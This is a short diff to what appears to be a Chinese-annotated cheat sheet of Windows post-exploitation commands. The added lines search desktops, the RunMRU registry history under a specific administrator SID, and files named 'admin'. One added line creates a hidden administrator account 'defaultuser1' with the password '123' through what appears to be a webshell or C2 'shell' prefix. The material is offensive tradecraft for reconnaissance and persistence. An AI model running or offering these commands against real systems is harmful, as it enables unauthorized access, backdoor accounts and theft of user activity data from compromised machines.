@@ -7,8 +7,12 @@ arp -a
 ipconfig /all
 dir /a C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent
 dir /a C:\Users\Administrator\Desktop
+dir /a C:\Users\public\Desktop
 reg query HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+reg query HKEY_USERS\S-1-5-21-3921407625-4142045542-3089788233-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 dir D:\ /s | findstr /i ora >c:\tmp.txt # 查找ora文件
+dir /s /b *admin*                       # 查找admin相关文件.
+shell net user defaultuser1 123 /add && net localgroup administrators defaultuser1 /add 
 ```
 
 ## web 路径
